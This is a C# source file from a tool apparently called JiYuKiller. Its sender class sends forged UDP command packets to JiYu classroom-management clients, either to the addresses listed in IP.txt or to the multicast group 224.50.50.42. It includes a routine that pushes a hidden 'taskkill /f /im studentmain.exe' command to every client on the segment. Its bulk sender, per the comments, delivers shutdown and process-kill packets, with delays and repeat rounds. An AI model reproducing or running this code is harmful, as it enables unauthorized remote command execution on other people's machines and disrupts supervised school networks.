using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace JiYuKiller.Core
{
    /// <summary>一次发送的结果统计。</summary>
    internal sealed class SendStats
    {
        public int Total;
        public int Sent;
        public int Failed;
        public int Skipped;
        public bool Cancelled;

        public override string ToString()
        {
            return "目标 " + Total + " 个 | 成功 " + Sent + " | 失败 " + Failed
                 + (Skipped > 0 ? " | 跳过 " + Skipped : "")
                 + (Cancelled ? " | 已中止" : "");
        }
    }

    /// <summary>发送参数（延时 / 重复）。</summary>
    internal sealed class SendOptions
    {
        /// <summary>首次发送前的延时（秒）。</summary>
        public int DelaySeconds;
        /// <summary>重复轮数（≥1）。</summary>
        public int Rounds = 1;
        /// <summary>每轮之间的间隔（秒）。</summary>
        public int IntervalSeconds = 5;

        public bool IsSimple { get { return DelaySeconds <= 0 && Rounds <= 1; } }
    }

    /// <summary>
    /// UDP 发送器。普通远程功能遍历当前目录 IP.txt 的每一行；
    /// 关闭指令固定发往全局广播地址 224.50.50.42（/h 隐藏指令包）。
    /// 支持紧急停止（<see cref="CancelAll"/>）、延时与重复发送。
    /// </summary>
    internal static class JySender
    {
        private static readonly Random Rng = new Random();

        /// <summary>全局广播（多播）组地址 —— 关闭指令发到这里才能生效。</summary>
        public const string MulticastGroup = "224.50.50.42";

        /// <summary>关闭所有极域连接的指令文本（配合 /h 隐藏窗口语义）。</summary>
        public const string KillCommand = "taskkill /f /im studentmain.exe";

        /// <summary>true 时普通远程功能也改发全局广播地址，而非 IP.txt（发送目标切换）。</summary>
        public static bool UseGlobalBroadcast { get; set; }

        /// <summary>紧急停止令牌：调用 CancelAll() 后所有进行中的发送立即中止。</summary>
        private static volatile CancellationTokenSource _cts;
        private static readonly object Gate = new object();

        public static string IpFilePath
        {
            get { return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "IP.txt"); }
        }

        /// <summary>中止所有进行中的发送。</summary>
        public static void CancelAll()
        {
            lock (Gate)
            {
                if (_cts != null)
                    _cts.Cancel();
            }
        }

        private static CancellationToken BeginScope()
        {
            lock (Gate)
            {
                if (_cts != null) _cts.Dispose();
                _cts = new CancellationTokenSource();
                return _cts.Token;
            }
        }

        /// <summary>
        /// 严格解析 IPv4（必须恰好 4 段、每段 0-255）。
        /// IPAddress.TryParse 过于宽松（"10.132.5" 会静默解析成 10.132.0.5），
        /// 本工具发送的是关机/杀进程指令，绝不能因少打一段而发错主机。
        /// </summary>
        public static bool TryParseIpv4(string text, out IPAddress ip)
        {
            ip = null;
            if (text == null) return false;
            string[] parts = text.Trim().Split('.');
            if (parts.Length != 4) return false;
            byte[] b = new byte[4];
            for (int i = 0; i < 4; i++)
            {
                string p = parts[i];
                if (p.Length == 0 || p.Length > 3) return false;
                int v;
                if (!int.TryParse(p, System.Globalization.NumberStyles.Integer,
                                  System.Globalization.CultureInfo.InvariantCulture, out v))
                    return false;
                if (v < 0 || v > 255) return false;
                b[i] = (byte)v;
            }
            ip = new IPAddress(b);
            return true;
        }

        /// <summary>读取 IP.txt 的全部非空行。</summary>
        public static List<string> ReadTargets()
        {
            var lines = new List<string>();
            string path = IpFilePath;
            if (!File.Exists(path))
                return lines;
            using (var reader = new StreamReader(path))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    line = line.Trim();
                    if (line.Length > 0)
                        lines.Add(line);
                }
            }
            return lines;
        }

        /// <summary>当前生效的目标列表（全局广播地址 或 IP.txt 内容）。</summary>
        public static List<string> EffectiveTargets()
        {
            return UseGlobalBroadcast
                ? new List<string> { MulticastGroup }
                : ReadTargets();
        }

        /// <summary>
        /// 向全局广播地址发送 /h 隐藏指令 taskkill /f /im studentmain.exe（单次）。
        /// </summary>
        public static void SendKill(Action<string> log, Action onDone, Action<Exception> onError)
        {
            var token = BeginScope();
            Task.Run(() =>
            {
                try
                {
                    var group = IPAddress.Parse(MulticastGroup);
                    var endpoint = new IPEndPoint(group, JyVersion.Port);
                    byte[] payload = JyPackets.BuildHiddenCommand(group, KillCommand, JyVersion.Port);
                    using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                        socket.Ttl = 1; // 局域网范围
                        socket.SendTo(payload, endpoint);
                    }
                    log("隐藏指令已发送至 " + MulticastGroup + ":" + JyVersion.Port + " (" + payload.Length + " 字节)");
                    log("关闭指令发送完成。224.50.50.42 是全局广播地址，网段内所有极域客户端均会收到。");
                }
                catch (Exception ex)
                {
                    onError(ex);
                }
                onDone();
            });
        }

        /// <summary>
        /// 向当前生效目标发送由 <paramref name="builder"/> 构造的报文。
        /// 支持延时、重复轮次与紧急停止；结束时以统计行收尾。
        /// </summary>
        public static void Broadcast(Func<IPAddress, byte[]> builder, Action<string> log,
                                     Action onDone, Action<Exception> onError,
                                     SendOptions options = null)
        {
            var opt = options ?? new SendOptions();
            if (opt.Rounds < 1) opt.Rounds = 1;

            var targets = EffectiveTargets();
            if (!UseGlobalBroadcast && targets.Count == 0)
            {
                log("IP.txt 不存在或没有可用的 IP。请先使用 IP.txt 生成器或编辑IP.txt，或把发送目标切换为全局广播。");
                if (onDone != null) onDone();
                return;
            }

            var token = BeginScope();
            Task.Run(() =>
            {
                var stats = new SendStats { Total = targets.Count * opt.Rounds };
                try
                {
                    // 延时阶段（可被紧急停止打断）
                    if (opt.DelaySeconds > 0)
                    {
                        log("将于 " + opt.DelaySeconds + " 秒后开始发送"
                            + (opt.Rounds > 1 ? "（共 " + opt.Rounds + " 轮）" : "") + "…");
                        if (!SleepCancellable(opt.DelaySeconds * 1000, token))
                            stats.Cancelled = true;
                    }

                    if (!stats.Cancelled)
                    {
                        using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                        {
                            for (int round = 1; round <= opt.Rounds && !stats.Cancelled; round++)
                            {
                                if (opt.Rounds > 1)
                                    log("第 " + round + "/" + opt.Rounds + " 轮开始。");

                                foreach (string line in targets)
                                {
                                    if (token.IsCancellationRequested) { stats.Cancelled = true; break; }

                                    IPAddress ip;
                                    if (!TryParseIpv4(line, out ip))
                                    {
                                        stats.Skipped++;
                                        log("[跳过] 不是一个有效的ipv4地址: " + line);
                                        continue;
                                    }
                                    try
                                    {
                                        byte[] payload = builder(ip);
                                        socket.SendTo(payload, new IPEndPoint(ip, JyVersion.Port));
                                        stats.Sent++;
                                        log("已发送至 " + ip + " (" + payload.Length + " 字节)");
                                    }
                                    catch (Exception ex)
                                    {
                                        stats.Failed++;
                                        log("[错误] " + ip + ": " + ex.Message);
                                    }
                                    Thread.Sleep(Rng.Next(10, 100));
                                }

                                if (round < opt.Rounds && !stats.Cancelled
                                    && !SleepCancellable(opt.IntervalSeconds * 1000, token))
                                    stats.Cancelled = true;
                            }
                        }
                    }

                    log(stats.Cancelled ? "已中止。" + stats : "本次操作发送完成！" + stats);
                    log("注意: 以上仅为本机发送结果, 不代表对端已执行。");
                }
                catch (Exception ex)
                {
                    onError(ex);
                }
                if (onDone != null) onDone();
            });
        }

        /// <summary>向单个地址同步发送一条报文（保留给需要单发的场景）。</summary>
        public static void SendToOne(string address, byte[] payload, int port)
        {
            IPAddress ip = IPAddress.Parse(address);
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
            {
                socket.SendTo(payload, new IPEndPoint(ip, port));
            }
        }

        /// <summary>可被取消的等待；返回 false 表示已取消。</summary>
        private static bool SleepCancellable(int ms, CancellationToken token)
        {
            if (ms <= 0) return true;
            return !token.WaitHandle.WaitOne(ms);
        }
    }

}
